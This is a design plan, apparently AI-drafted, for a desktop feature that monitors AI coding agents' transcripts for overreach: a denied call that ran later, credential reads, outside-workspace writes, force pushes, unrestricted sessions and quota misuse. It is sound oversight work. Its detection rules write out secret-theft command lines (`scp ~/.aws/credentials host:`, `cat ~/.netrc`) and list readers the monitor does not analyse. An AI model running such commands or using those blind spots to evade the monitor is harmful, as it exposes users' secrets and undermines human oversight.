# Plan: Agent incidents (unauthorized usage, human resolve, vendor report)

Version: v0.11. Status: draft for the plan gate.

## Run record

| Item | Value |
|---|---|
| Fleet | orca-agent-fleet, standard roster, transport Orca |
| Planner | Claude Code (`claude-opus-5-5`), calling pane |
| Coder and reviewer | DeepSeek V4.1 Flash through OpenCode (`deepseek/deepseek-flash`) |
| Third judge | Codex CLI 0.167.0 |
| `$SCRATCH` | `/var/folders/x3/8mdzc51d11j_z0l1mt77lpmr0000gn/T//fleet-r9r0gQ` |
| Branch | `feat/unauthorized-usage-monitor`, cut from `32ccd17` (`feat/delivery-evidence`) |
| Why that base | The feature reuses `Evidence/` (tool-record parsing, `CommandClassifier`), which is not on `main` yet |
| Review base | Written here at Step 5 |

## What the user asked for

Vibra monitors an agent's unauthorized usage for free. A human resolves each
finding, or Vibra helps them report it to the agent's vendor. The user chose
all three readings of "unauthorized":

1. **Agent overreach.** The agent did something the user did not sanction.
2. **Stolen quota.** Someone else consumed the user's API allowance.
3. **Auth failures.** A vendor rejected the agent's credentials (401).

## Decisions made without the user, which they can overturn

| # | Decision | Reason | What the user could say instead |
|---|---|---|---|
| D1 | A report is a local draft. The user sends it from their own mail client or browser | README, `docs/privacy.md` and ROADMAP P1.2 promise no network. The original request also says human in the loop | "Build a Silex backend that sends it" removes the `Network: none` promise and needs a service |
| D2 | Stolen quota is checked by importing a usage file the user fetched, never by Vibra calling the vendor | Same promise. Vibra also never holds an admin key | "Add an opt-in vendor API call" is a later, separate change |

## Measured facts this plan rests on

Probes are in `$SCRATCH/probe/` and print enumerated values and counts only.
Window is 30 days on the planner's machine, run 2026-11-09.

| Signal | Count | Probe |
|---|---|---|
| Claude Code JSONL files read | 602 | `auth_signal_census.py` |
| Claude `permissionMode` records: auto / default / bypassPermissions | 8483 / 198 / 20 | same |
| Claude files carrying bypassPermissions | 5 | same |
| Claude denied results: "Permission for this action" / "The user doesn't want to" | 48 / 20 | same |
| Claude API error records: rate_limit / server_error / authentication_failed | 20 / 6 / 1 | same |
| Codex rollout files read | 201 | same |
| Codex turns: approval never / on-request | 78 / 762 | same |
| Codex turns: sandbox workspace-write / read-only / danger-full-access | 734 / 102 / 4 | same |
| Codex `event_msg` payload types named approv, error, denied, reject, declin, auth or sandbox (the `approval_policy` and `sandbox_policy` fields above are present) | 0 | `auth_signal_census2.py` |
| Claude `permission-mode` record keys | `type`, `permissionMode`, `sessionId` only | same |
| Claude `permission-mode` records with a timestamp | 0 of 7417 | `auth_signal_census3.py` |
| Other Claude records carrying `permissionMode`, with a timestamp | 1519 of 1519 | same |
| Claude API error records with `uuid` and `timestamp` | 27 of 27 | same |
| Codex command and file items with `id` | 3264 of 3264 | same |
| Codex `event_msg` `token_count` records where cached is at most input | 3821 of 3821 | `auth_signal_census3.py` |
| Codex `token_usage_record.payload.usage`, the records Vibra's sampler sums | 3855 | `auth_signal_census5.py` |
| Of those, records where input plus output differs from total | 0 | same |
| Codex `CommandExecution` item status values / `FileChange` | completed, failed / completed | `auth_signal_census2.py` |

Consequences. Codex rollouts here hold no denial or auth event, so those two
detections are Claude Code only in v1. A `permission-mode` record carries no
`additionalDirectories`, so a `--add-dir` grant is invisible and a write there
shows as outside the workspace until a human marks it expected.

## Vendor facts, checked at the source on 2026-11-09

| Fact | Evidence |
|---|---|
| Anthropic usage report: `GET /v1/organizations/usage_report/messages`, top level `data`, `has_more`, `next_page`. Bucket `starting_at`, `results[].{api_key_id, uncached_input_tokens, cache_read_input_tokens, cache_creation.{ephemeral_1h_input_tokens, ephemeral_5m_input_tokens}, output_tokens, model}`. `api_key_id` is null unless grouped, and `api_key_ids[]` filters | platform.claude.com API reference, fetched |
| That endpoint is marked legacy and "remains supported". Its replacement is `/v1/organizations/analytics/usage` | same |
| "The Admin API is unavailable for individual accounts." | platform.claude.com usage-cost-api page, fetched |
| OpenAI usage: `GET /v1/organization/usage/completions`, top level `object: page`, `data`, `has_more`, `next_page`. Bucket `start_time` in epoch seconds, `results[].{api_key_id, input_tokens, output_tokens, input_cached_tokens, model}`. `api_key_ids` filters, `group_by` accepts `api_key_id`. `input_tokens` includes "cached and cache-write tokens" | developers.openai.com API reference, fetched |
| Claude Code security reports go to HackerOne (`hackerone.com/anthropic`) | `anthropics/claude-code` SECURITY.md through `gh api` |
| Codex security reports go to Bugcrowd (`bugcrowd.com/engagements/openai`) | `openai/codex` SECURITY.md through `gh api` |
| Both repos have issues enabled. Neither SECURITY.md publishes an email address | same, `$SCRATCH/probe/channels.sh` |
| `help.openai.com` answered 403 to `curl`, the other five URLs answered 200 or 302 | curl with a browser user agent. The 403 is **inconclusive**, not proof the page is gone |

So the email draft ships with an empty recipient. Vibra will not invent a
vendor address. The user fills in the recipient, which may be their own
security team.

Console CSV exports exist but no source states their columns, so CSV import is
out of scope, for the same reason ROADMAP P4.5 deferred an adapter: it would be
a guessed format with no live check.

## Coverage, stated in the UI as well

| Detection | Claude Code | Codex | Others |
|---|---|---|---|
| Denied call ran later | yes | no signal | not covered |
| Credential read attempt, by the named commands and options only. An unrecognised option declines the command. `sed`, `awk`, `xxd`, `strings`, `gh auth token`, scripts and interpreter one-liners are not analysed | yes | yes | not covered |
| Project `.env` named, one info item per session | yes | yes | not covered |
| Write to a path outside the workspace, tool edits only, by the path as written, symlinks not followed. One review item per session and destination family | yes | yes | not covered |
| Force push attempt | yes | yes | not covered |
| Unrestricted session | yes | yes | not covered |
| Auth failure | yes | no signal | not covered |
| Unexplained vendor usage, for one API key in an organization | yes | yes | not covered |

Claude Pro or Max and ChatGPT-plan usage appear in no report Vibra can import,
so stolen-quota detection cannot help those users. Subscription use on this Mac
also counts as local usage, so it can mask excess on the same day. A response
recorded in both a main and a subagent file counts twice locally, which leans the
same safe way. The window
says both.

## Data shape

An incident holds closed enums, dates, token counts and parsed identifiers. It
holds no command, path, prompt or output, so a report cannot leak what the
incident does not carry.

```swift
public enum IncidentKind: String, Codable, Sendable, CaseIterable {
    case deniedCallRanLater, credentialReadAttempt, workspaceSecretFileNamed
    case writeToPathOutsideWorkspace, forcePushAttempt
    case unrestrictedSession, authFailure, unexplainedVendorUsage
}

public enum CredentialClass: String, Codable, Sendable {
    case dotEnv, sshKey, awsCredentials, netrc, packageToken, gitHubCLI, agentCredential, keychain
}

public enum SessionPosture: String, Codable, Sendable {
    case claudeBypassPermissions, codexDangerFullAccess
    case sandboxed, approvalsOn, unknown
}

public enum VendorProvider: String, Codable, Sendable { case anthropic, openai }

/// Parsed at the boundary: a valid `YYYY-MM-DD`. Rendered from this value, so a
/// UTC day never displays as the previous local evening.
public struct UTCDay: Sendable, Hashable, Comparable { public let iso: String }

public struct VendorExcess: Sendable, Equatable {
    public let provider: VendorProvider
    public let day: UTCDay
    public let vendorTokens: Int
    public let localTokens: Int
}

public enum FindingEvidence: String, Codable, Sendable {
    case toolResult        // a tool call, or a sole command that exited 0
    case commandLine       // named in shell text that may not have run that branch
    case transcriptRecord  // a posture or API error record in the transcript
    case vendorFile        // the imported usage file
}

public enum IncidentDetail: Sendable, Equatable {
    case credential(CredentialClass)
    case tool(ToolClass)              // closed: bash, edit, write, read, fileChange, other
    case write(ToolClass, WriteFamily) // closed: sibling, elsewhere
    case posture(SessionPosture)
    case authError
    case vendorExcess(VendorExcess)
}

public struct Incident: Sendable, Equatable, Identifiable {
    public let id: IncidentID         // see Incident identity
    public let kind: IncidentKind
    public let agent: AgentKind?      // nil for a vendor file finding
    public let evidence: FindingEvidence
    public let at: Date               // when the action began
    public let completedAt: Date      // the result record, else equal to `at`
    public let posture: SessionPosture
    public let detail: IncidentDetail
}

public enum Disposition: Sendable, Equatable, Codable {
    case open
    case expected(at: Date)           // "this was me or I allow it"
    case resolved(at: Date)
    case reported(at: Date)           // set by the user. Vibra cannot see a send
}
```

`IncidentMonitor` keeps `[IncidentID: String]`, an in-memory lookup from an
incident to its raw session id, used only by **Jump to session**. The id never
enters an `Incident`, the store, CLI output or a draft, and it is not serialized.
So a session id shaped like a secret reaches none of them. The extractor protocol
is declared in `Incident.swift` in Task 1, and Task 2 only adds conformers.

One table holds severity, title, guidance and the route per kind, so nothing
else branches on kind:

```swift
struct IncidentRule { severity, title, guidance, route: ReportRoute }
enum ReportRoute { case none, agentBug, billing }
```

| Kind | Severity | Route | Guidance in one line |
|---|---|---|---|
| deniedCallRanLater | review | agentBug | A call was denied and the identical call ran later. You or a rule may have approved the retry |
| credentialReadAttempt | review | agentBug | A read of a credential. Rotate the secret if you did not expect this |
| workspaceSecretFileNamed | info | none | This project's own `.env` was named in this session |
| writeToPathOutsideWorkspace | review | agentBug | A tool edited a path outside the workspace as written, at least once in this session. A `--add-dir` grant or a symlink looks the same. Mark it expected if so |
| forcePushAttempt | review | agentBug | A force push. Check the branch history |
| unrestrictedSession | info | none | You or your config turned guardrails off. Not a vendor fault |
| authFailure | info | none | Sign in again, or rotate the key if you did not change it |
| unexplainedVendorUsage | review | billing | Another of your machines or apps looks the same. If not, rotate the key |

The window and draft add one sentence from `evidence`, so the guidance never
claims more than the record shows:

| `evidence` | Sentence |
|---|---|
| toolResult | The tool call completed. |
| commandLine | It was named in a shell command line and may not have run. |
| transcriptRecord | Recorded in the agent's transcript. |
| vendorFile | Calculated from the usage file you imported. |

Wording rule. Vibra states what it saw and what else could explain it. It never
says an agent was malicious or a key was stolen.

### Incident identity

`id` is hex SHA-256 of `agent|session|kind|anchor`, with `-` for a nil agent or
session. The anchor is positional and never derived from content. When the same
id is found twice, as a session's main and subagent files can do, the earliest
`at` and the latest `completedAt` win. Reopening a write finding depends on the
latest `completedAt`.

| Kind | Anchor |
|---|---|
| deniedCallRanLater, credentialReadAttempt, forcePushAttempt | the agent's own opaque id for the call: Claude `tool_use.id`, Codex `item.id` |
| writeToPathOutsideWorkspace | the literal `session-write-outside-sibling` or `session-write-outside-elsewhere`, one per session and destination family |
| authFailure | the record's `uuid` |
| unrestrictedSession | the literal `session`, one per session |
| workspaceSecretFileNamed | the literal `session-dotenv`, one per session |
| unexplainedVendorUsage | provider, UTC day and the file's `api_key_id`, inside the hash only, without amounts. Two keys never share an answer, and a re-import keeps it |

## Detection rules

An `IncidentExtractor` folds transcript lines and returns incidents as they
complete. It mirrors `EvidenceExtractor` and keeps its pre-filter by raw bytes.
A `tool_result` line is parsed only when it carries a denial prefix or answers a
call that is waiting.

**Execution evidence.** A transcript shows that a tool call ran, not what each
branch of its shell did. So a finding is made only once the call has a result
that is not a denial or a never-started error, and its result record sets
`completedAt`. `evidence` is set per kind. `deniedCallRanLater` and
`writeToPathOutsideWorkspace` are always `toolResult`, because their claim is about
the tool call that produced the result, not about a branch of a shell.
`credentialReadAttempt`, `workspaceSecretFileNamed` and `forcePushAttempt` are
`toolResult` for a non-shell tool call, or for a shell command that is the only
simple command, in the foreground, and exited 0. Background forms, `&` or Claude's
`run_in_background`, never qualify, because their result does not prove the command
finished. Any other shell finding of those three kinds is `commandLine`.
`unrestrictedSession` and `authFailure` are `transcriptRecord`, and
`unexplainedVendorUsage` is `vendorFile`. A pending call yields nothing. Kinds with no call
(`unrestrictedSession`, `authFailure`, `unexplainedVendorUsage`) set `completedAt`
equal to `at`. Case table: pending, denied, failed and completed for each kind.

**Path normalization**, shared by every path rule. Expand a leading `~` against
`VibraPaths.home`, expand `$HOME` and `${HOME}` the same way, resolve a relative path against the current `cwd`, apply
`standardizedFileURL`, strip a leading `/private` from `/private/var` and
`/private/tmp`, and never resolve symlinks. A path that cannot be resolved, or a
call with no known `cwd`, produces no incident.

- **deniedCallRanLater** (Claude). A `tool_use` whose `is_error` result starts
  with `The user doesn't want to` or `Permission for this action`, followed in the
  same file by a call with the identical tool name and canonical input whose
  result is not an error, with no human-authored `user` record in between. The
  second prefix can be an automatic denial, so the title says denied, never
  "you refused". The rest of `neverRan` (`<tool_use_error>`, `Not started:`,
  `[Tool call did not complete`) are not denials and are excluded, as is `Claude
  requested permissions`, which is unverified. The fingerprint is held in memory
  and never persisted or used in an id. Capped at 256 per file, oldest first, so
  a repeat more than 256 calls later is missed, and a case pins that. An approval
  click writes no `user` record, so a human approving the retry still fires, and
  the guidance says so.
- **credentialReadAttempt**. Claude `Read`, or a shell simple command from
  `CommandClassifier.simpleCommands(in:)`, which returns the word lists and
  `soleForeground: Bool`, whose command word is a reader with a
  path operand that matches the credential table, or `security
  find-generic-password` / `find-internet-password`. `simpleCommands` carries its own
  list, separate from `CommandClassifier`'s `wrappers`, and strips
  leading assignments and the wrappers `sudo`, `env`, `command`, `nohup` and
  `time`, including `sudo -u <v>`, `sudo -g <v>`, `env -u <v>` and `env -i`. An
  operand matches the credential table when it equals a table path, lies under a
  table directory prefix such as `~/.aws/` or `~/.ssh/`, or its last component is a
  table name family at a dot boundary. The family `.env` matches `.env`,
  `.env.local` and `.env.production`. Then the excluded names drop out:
  `.env.example`, `.env.sample`, `.env.template`, `*.pub`, `known_hosts`,
  `authorized_keys`, `~/.ssh/config` and `~/.aws/config`. Cases cover all six `.env` forms, inside the workspace
  (`workspaceSecretFileNamed`) and outside it (`credentialReadAttempt`). When one
  call names several classes, the first matching operand decides.

  Options are classified per reader, in clusters where the command allows it. An
  option not listed for its reader declines that simple command only, and no
  finding is made rather than a guess. The flag lists are a deliberate subset
  of each command's real flags. A `--name=value` is one word. An input
  value is matched against the table like an operand. `head` and `tail` also accept
  a bare `-[0-9]+`.

  | Reader | Boolean | Input value | Literal or output value | Operands that count |
  |---|---|---|---|---|
  | `cat` | `-n -b -e -s -t -u -v -A -E -T` | none | none | every operand |
  | `less`, `more` | `-R -N -S -d` | none | none | every operand |
  | `source`, `.` | none | none | none | the first operand |
  | `base64` | `-d -D` | `-i`, `--input` | `-o`, `--output`, `-b`, `--break` | every operand |
  | `head`, `tail` | `-q -v -f -F` | none | `-n`, `-c` | every operand |
  | `cp` | `-a -f -i -n -p -r -R -v -L -P -H` | none | `-S`, and `-t`, whose value is the destination | every operand except the last, or all with `-t` |
  | `scp` | `-r -p -q -C -3 -4 -6 -B -O -T -v -A` | none | `-P -l -o -c -J -F -i`. `-i` is a deliberate suppression, because a deploy key is routine | every operand except the last |
  | `grep`, `rg` | `-r -R -n -i -l -L -H -h -s -v -w -c -q -E -F -I -o` | `-f`, `--file` | `-e`, `-A`, `-B`, `-C`, `-m`, `-g`, `--include`, `--exclude` | every operand after the first, or all with `-e` or `-f` |

  `mv` is not a reader, because a rename does not read contents. These do not
  fire: `cp .env.example .env`, `cp README ~/.aws/credentials`, `cp -t
  ~/.aws/credentials README`, `base64 -i README -o ~/.aws/credentials`, `mv
  ~/.ssh/id_rsa /tmp/x`, `grep .env .gitignore`, `echo ~/.ssh/id_rsa`, `cat
  --unknown ~/.netrc`. These do: `grep -r KEY ~/.aws`, `grep -f ~/.aws/credentials
  README`, `scp ~/.aws/credentials host:`, `sudo -u root cat ~/.aws/credentials`,
  `env FOO=1 cat ~/.netrc`, and `grep -l KEY ~/.aws`, which a case pins as
  deliberate. `sed`, `awk`, `xxd`, `strings`, `python -c`, `node -e` and a script
  file do not, matching the coverage row. `false && cat ~/.netrc` fires with
  `evidence` `commandLine`, and a case pins it.
- **workspaceSecretFileNamed**. The same match with class `dotEnv` where the
  operand is inside the current workspace, including a skipped branch such as
  `false && cat .env`. One info item per session, no notification. A `dotEnv` read outside the workspace stays
  `credentialReadAttempt`.
- **writeToPathOutsideWorkspace**. Claude `Edit`, `Write`, `MultiEdit`, `NotebookEdit`
  and Codex `FileChange` keys, on a successful result only (Claude not `is_error`,
  Codex status `completed`). The path is outside the current workspace, the
  scratch prefixes in `EvidenceExtractor`, and the agents' own state directories
  (one list of roots, currently `~/.claude/projects`, confirmed present on the
  planner's machine). The
  workspace is folded per
  file: Claude's latest record `cwd`, Codex's latest `turn_context` `cwd` plus
  `workspace_roots`. One finding per session and destination family, because on
  the planner's machine 177 writes in 7 days fell in 13 sessions and 165 were sibling
  repositories. `sibling` means under the parent of the session's cwd, unless that
  parent is the home directory or the root, or the workspace is home itself, and
  everything else is `elsewhere`. The family is carried in the detail and shown in
  the window, the JSON and the draft, so the unusual writes can be told apart. An answer closes the
  finding only until a later write: when a write in that family completes after the
  answer's date, the finding shows as open again and is eligible for a notification. Paths are lexical, so a symlink inside the workspace that
  points out, or the reverse, is not seen, and the guidance says so. Shell
  redirection is not analysed.
- **forcePushAttempt**. A simple command `git`, optionally with `-C <dir>` or
  `-c <kv>`, then `push` with `--force`, `-f` or a `+` refspec, and without
  `--dry-run` or `-n`. `--force-with-lease` alone is the safe form and is exempt.
  A `+` refspec or `--force` alongside it is still an unconditional force and fires,
  so `git push --force-with-lease origin +HEAD:main` is a case.
  `false && git push --force` fires as an attempt.
- **unrestrictedSession**. One incident per session at the first record with
  Claude `permissionMode` or `mode` equal to `bypassPermissions`, or Codex
  `sandbox_policy.type` `danger-full-access`. Real `permission-mode` records have
  no timestamp, so `at` is that record's timestamp if it has one, else the first
  timestamped record in the file, else the file's modification date. Codex
  approval `never` inside a sandbox is not an incident.
- **authFailure** (Claude). `isApiErrorMessage` with `error` equal to
  `authentication_failed`.
- **unexplainedVendorUsage**. Reconciled per provider and UTC day, summed across
  models. Summing avoids model matching, and a model never used locally still
  counts, which is exactly what theft looks like. Anthropic files compare with
  Claude Code samples, OpenAI files with Codex samples.

| Side | Formula |
|---|---|
| Anthropic file | `uncached_input + cache_read_input + ephemeral_1h + ephemeral_5m + output` |
| Claude Code local | `input + cacheRead + cacheCreation + output` |
| OpenAI file | `input_tokens + output_tokens`, because `input_cached_tokens` is a subset of input |
| Codex local | `input + output`, for the same reason. Never `TokenUsage.total` |

An incident only when `excess = vendor - local` exceeds
`max(0.10 * vendor, 100_000)` tokens. Both thresholds are a starting guess,
labelled so in code and docs. Local above vendor is never a finding.

A day is **unreconciled** and never an incident when it is earlier than the
earliest local sample for that agent, or is the current UTC day. A later day with
zero local usage is a real candidate, not a gap.

The importer accepts the documented page shape including the `api_key_id`
grouping key, and rejects anything else, naming the expected keys. `has_more`
must be present and false, because a partial file would misreport. Every non-empty
result must carry the same non-null `api_key_id`, because an organization-wide
total cannot be compared with one Mac. Help text gives the `curl` scoped with the
key filter and `group_by` for each vendor.

Local samples come from a `ReportIngest` built with only the adapter for the
file's provider, through `collect(window:)`, with `days` equal to the whole UTC days
from the oldest bucket's midnight to today, plus two. That sets only the file
cutoff. `ReportWindow.start` and `today` are unused, because samples are bucketed by
their own UTC timestamps, not by `UsageBucket`, in a function beside `[LocalDay]`
in `VendorUsage.swift`, so tests can reach it. Every file modified since the cutoff
is read in full. No filter looks inside a file, because neither adapter guarantees
record order. The importer refuses a file whose oldest bucket is more than 62 days
old, which bounds the read, and the import help text states that limit and the
one-key requirement, as does `docs/features.md`. Import never
notifies and never touches the watermark, so it cannot silence a monitor alert.

## Monitoring and resolving

- `IncidentMonitor` is an actor with its own offsets, sharing no state with
  `SessionIngest`, as `ReportIngest` and `EvidenceIngest` do. At launch it replays
  from byte 0 every Claude and Codex file modified in the last 7 days, at utility
  priority, then polls every 30 seconds and reads only files whose size changed.
- Offsets are deliberately not persisted. A replay rebuilds all detection state,
  so a denial before a restart and its retry after one are both seen. Ids are
  stable, so a replay finds the same incidents and keeps their dispositions.
- Each file is tracked by device, inode, last size and modification time. The
  offset and extractor reset to byte 0 when the device or inode changes, the file
  shrinks, or the size is unchanged since the last look and the modification time
  changed. `IncrementalLineReader` alone would never re-read such a file. An
  in-place rewrite that also grows the file is not detected, and the docs say so.
- Per-file state is bounded: 256 pending calls and 1024 seen call ids, oldest
  first. An evicted pending call yields no finding. When a file leaves the 7-day
  scan its state and in-memory lookups are dropped, and its findings leave the
  window. A closed answer stays in the store for 90 days. Task 7 records resident
  memory.
- `IncidentStore` is an actor and the only reader and writer of
  `VibraPaths.home/Library/Application Support/Vibra/incidents.json`, so
  `VIBRA_HOME` isolates tests and snapshots. The monitor, window and import send it
  merge-by-id messages and never replace the file wholesale. Writes go by temp file
  and rename. It holds a schema version, the notification watermark, and non-open
  dispositions as `{id: {state, at}}`. Entries older than 90 days are pruned on
  save. A corrupt file is renamed to `incidents.corrupt-<unix>.json`, kept, and
  treated as empty, and the window shows one line saying answers were reset.
- `docs/privacy.md` replaces "The only thing Vibra persists between runs is its
  four settings", describes the store and retained corrupt copies, rewrites
  "Uninstalling Vibra is deleting one `.app`" to include deleting that folder, and
  adds it to the override bullet. A new bullet states that the monitor is always
  on: it parses Claude Code and Codex transcripts modified in the last 7 days at
  launch and every appended line afterwards, including tool inputs, shell command
  text, edited paths and tool results, reduces them to enums and ids in memory, and
  writes only hashed ids, the watermark and the user's answers. `--incidents` joins
  the content-free commands. `README.md`'s matching lines change with it.
- **Notification order.** Delivery is at most once, and one rule covers every
  path: an incident is eligible only when `completedAt` is later than the persisted
  watermark. A replay of an old or aged-out file therefore cannot re-alert. For
  each eligible batch `IncidentStore` commits `max(stored, batch maximum)`, and it
  refuses any lower value, then the notification is delivered. A crash before the
  commit delivers nothing and the next replay finds the batch. A crash between
  commit and delivery loses one notification and never duplicates it. A record
  that reaches disk after a later one has advanced the watermark also loses its
  notification. Every lost notification still leaves the finding in the menu count
  and window. The watermark starts at launch time on first run, so backfilled
  findings do not notify. Delivery is `review` severity only, under the key
  namespace `incident:`, with a count-only body, and at most once per 60 seconds. A batch found inside
  the interval waits in memory and is committed when it is delivered, so a crash
  while it waits loses nothing.
- The menu gains **Review agent activity… (N)** where N is open review items.
  The window lists incidents, newest `completedAt` first, with the facts, the guidance, and buttons:
  **Expected**, **Resolved**, **Jump to session**, **Draft report…** when the
  route is not `none`, **Reopen** on a closed one.
- **Import vendor usage…** opens a file panel. Off the main thread and never on
  the poll, it parses the JSON in memory, reads local samples as Detection rules
  defines, and runs the pure reconcile. The button is disabled with a progress line
  while it runs. The read cannot be cancelled. Closing the window discards the
  eventual result. The file is never stored and
  Vibra never sees a key. Excess rows live for the app run, and their dispositions
  persist by id. Help text gives the exact scoped `curl` for each vendor.
- `Vibra --incidents [--days N] [--json]` prints the same content-free findings.
  `N` filters on `completedAt` and does not change the monitor's window. JSON
  includes each finding's disposition and its date.
  `Vibra --show-incidents --snapshot <path>` renders the window, like the other
  `--show-*` diagnostics.

## Reporting

`VendorReport.draft(incident:app:os:)` is pure. The body lists agent or provider,
kind, posture, tool class or credential class, UTC minute or UTC day, token counts
for a vendor finding, OS and Vibra version, then a blank section headed "What I
expected" for the user. It never includes a session id or key id. The preview is
editable.

Buttons: **Copy**, **Open Email Draft** (`mailto:` with empty recipient, subject
and body, capped so the URL stays under 1800 bytes), **Open Vendor Page**. Pages
carry no query string. The page comes from one table, keyed by agent for agent
findings and by provider for vendor findings:

| Key | agentBug | Security program (secondary link) | billing |
|---|---|---|---|
| Claude Code | `github.com/anthropics/claude-code/issues/new` | `hackerone.com/anthropic` | not used |
| Codex | `github.com/openai/codex/issues/new` | `bugcrowd.com/engagements/openai` | not used |
| Anthropic | not used | not used | `support.claude.com` |
| OpenAI | not used | not used | `help.openai.com` |

Vibra never concludes a finding is a vulnerability, because a human-approved
outside write has the same transcript evidence as a sandbox escape. The security
link sits beside the bug link and the human chooses. If a page has moved, **Copy**
and the email draft still work.

The GitHub route warns that issues are public. The security link warns
that these programs want validated findings and that the user should confirm
first. The disposition becomes `reported` only when the user clicks
**Mark as reported**. Opening the mail client or browser is the user's own
action through `NSWorkspace`. Vibra makes no request.

## Tasks

Owner `planner` or `deepseek`. Each deepseek task is one dispatch, one at a time.

| # | Owner | Depends on | Task | Acceptance |
|---|---|---|---|---|
| 1 | planner | none | Foundation: types, rule table, the extractor protocol, `incidentExtractor()` on the adapter protocol, and `IncidentJSON` | `swift build` green, a test pins the JSON key set to bounded values, checkpoint commit |
| 2 | deepseek | 1 | Extractors, credential table, `simpleCommands`, fixtures | Case table passes on extractor findings and through `IncidentJSON`, including a compound denied retry that is `toolResult`, pending, denied, failed and completed for each kind, every example in Detection rules, all four `evidence` values, foreground against backgrounded, the 256 cap, replayed ids, and a session id shaped like a secret reaching no incident or JSON |
| 2b | planner | 2, 5 | Session and family grouping for outside writes, reopening after a later write | The extractor emits each write with the same id per family, and the monitor shows one finding per family, for both agents. The window and draft name the family. The guidance reads "at least once in this session". A later write after an answer reopens it, across a restart, and notifies. An earlier write does not reopen it. The oracle applies the same rule and counts still match |
| 3 | deepseek | 1 | Vendor file parsers and the pure reconcile over `[VendorDay]` and `[LocalDay]` | The Anthropic fixture is the documented grouped example with only `has_more` set false and `next_page` null, the same page with `api_key_id` null is a rejection case, and the OpenAI fixture follows its reference. Each formula's assertion shows the correct sum and one wrong sum. Wrong shape, absent or true `has_more`, and null or multiple keys rejected. Threshold boundaries pinned. A day before local coverage and the current UTC day are unreconciled. Key switching and a re-import with changed amounts behave per Incident identity |
| 4 | deepseek | 1 | Draft and channel table | Exact draft text with the `evidence` sentence for every kind whose route is not `none`, 1800-byte cap, vendor findings build for both providers, vendor pages carry no query, no sentinel in the draft or the percent-encoded `mailto:` |
| 5 | planner | 1, 2 | Monitor, `IncidentStore` actor, notifier | Idle poll reads 0 bytes. An injected crash before commit and between commit and delivery behaves as specified. A stale window write cannot drop a monitor update or rewind the watermark. Restart does not re-notify. Replay finds the same ids. Device, inode, shrink and same-size rewrite, including with a partial final line, reset to byte 0. A file aging out drops its state, and its later append and a restart do not re-alert. A batch older than the watermark cannot move it back. A tool completing after the watermark alerts. First run does not notify |
| 6 | planner | 3, 4, 5 | Window, menu, CLI, and the import read that feeds UTC-bucketed samples into the reconcile | `--show-incidents --snapshot` renders each state, `Vibra --incidents --json` output checked, import never runs on the poll, closing the window during an import discards the result and leaves no excess rows, samples on both sides of a local-midnight and a UTC-midnight boundary land on the right day, a file older than 62 days is refused, a file whose newest day is weeks before today still reads a transcript modified on its oldest day, `ReadStats.files` on a fixture tree counts only files modified since the cutoff, and both an out-of-order transcript and a transcript copied after the interval are counted |
| 7 | planner | 5, 6 | Independent Python oracle, canary in `make test`, perf comparison | The planner runs the oracle on real transcripts and it prints counts only, no seat reads them. Counts equal Swift counts per kind, `make test` green, `tools/gate/perf-bench.sh` before and after. Launch replay bytes and wall time on real 7-day data recorded, budget 30 s at utility priority and 150 MB resident, labelled a budget, with an import's bytes and wall time. Exceeding it stops Task 7 and returns to the seats |
| 8 | planner | 7 | `docs/privacy.md`, `docs/features.md`, `CHANGELOG.md`, `docs/ROADMAP.md`, README rows | Each claim traced to a probe, including the always-on reader bullet in `docs/privacy.md`. Translated READMEs flagged, not rewritten |

### File ownership

- **planner**: `Sources/VibraCore/Incidents/Incident.swift`,
  `Sources/VibraCore/Incidents/IncidentJSON.swift`,
  `Sources/VibraCore/Incidents/IncidentText.swift`,
  `Sources/VibraCore/Incidents/IncidentMonitor.swift`,
  `Sources/VibraCore/Incidents/IncidentStore.swift`,
  `Sources/VibraCore/Adapters/AgentAdapter.swift`,
  `Sources/VibraApp/IncidentsWindowController.swift`,
  `Sources/VibraApp/MenuBarController.swift`, `Sources/VibraApp/main.swift`,
  `Tests/VibraCoreTests/IncidentMonitorTests.swift`,
  (Task 2b, reassigned after Task 2 closed, together with code-gate repairs)
  `Sources/VibraCore/Incidents/IncidentExtractor.swift`,
  `Tests/VibraCoreTests/IncidentExtractorTests.swift`,
  `Tests/VibraCoreTests/Fixtures/incident-cases.json`,
  `Tests/VibraCoreTests/IncidentPrivacyTests.swift`,
  `tools/incident-oracle/incident_oracle.py`, `Makefile`, `README.md`,
  `CHANGELOG.md`, `docs/privacy.md`, `docs/features.md`, `docs/ROADMAP.md`,
  this plan.
- **deepseek**: `Sources/VibraCore/Incidents/CredentialTable.swift`,
  `Sources/VibraCore/Incidents/VendorUsage.swift`,
  `Sources/VibraCore/Incidents/VendorReport.swift`,
  `Sources/VibraCore/Evidence/CommandClassifier.swift` (add
  `simpleCommands(in:)` returning word lists and `soleForeground` only, private types stay private, and
  update its header comment, which says only two enums leave it), `Sources/VibraCore/Adapters/ClaudeCodeAdapter.swift` and
  `Sources/VibraCore/Adapters/CodexAdapter.swift` (the extractor hook only),
  `Tests/VibraCoreTests/VendorUsageTests.swift`,
  `Tests/VibraCoreTests/VendorReportTests.swift`,
  `Tests/VibraCoreTests/Fixtures/vendor-usage-anthropic.json`,
  `Tests/VibraCoreTests/Fixtures/vendor-usage-openai.json`.

Seats read sanitized fixtures only. No seat reads `~/.claude`, `~/.codex` or any
real transcript. The census output above is counts of enumerated values.

## Privacy invariants

`IncidentJSON` in VibraCore is the only encoder and `main.swift` calls it, so tests
reach the real output. A new canary, `incidentSentinelsNeverLeak`, joins `CANARIES` in the Makefile. It
plants a sentinel in a command, path, tool output, prompt and vendor key id, and
asserts it appears in no incident, JSON output, store file, draft or error. It
also plants a secret-shaped session id and a vendor key id, the percent-encoded `mailto:`
and the vendor page URL, and asserts the store holds no 64-hex digest other than
incident ids. It writes only under `VIBRA_HOME`.

## Not in this change

Other agents' detections. Blocking or interrupting an agent, since Vibra only
observes. Console CSV import. Any network call. Automatic sending. Shell
redirection analysis, and shell writes to a credential path. Cursor and Hermes channels, whose published addresses are
unreachable until those agents have detections.

## Round objections

### Round 1 objections to changes (v0.1 to v0.2)

Codex had not reviewed v0.1. It was blocked on a startup dialog, so it reviews
v0.2 first.

| # | Objection (who) | Change |
|---|---|---|
| 1 | `neverRan` holds non-refusals, deny-then-approve fires (DeepSeek) | Two verified prefixes only, no human `user` record between, guidance states the approval case |
| 2 | `grep` is a read, path forms undefined, coverage overclaimed (DeepSeek) | `grep`, `rg`, `sed`, `awk` added with pattern-word handling, normalization defined, interpreters declared out and tested as non-detection, coverage row qualified |
| 3 | Codex workspace lives in `turn_context`, missing `cwd` undefined (DeepSeek) | Folded per file, last wins, missing `cwd` yields no incident |
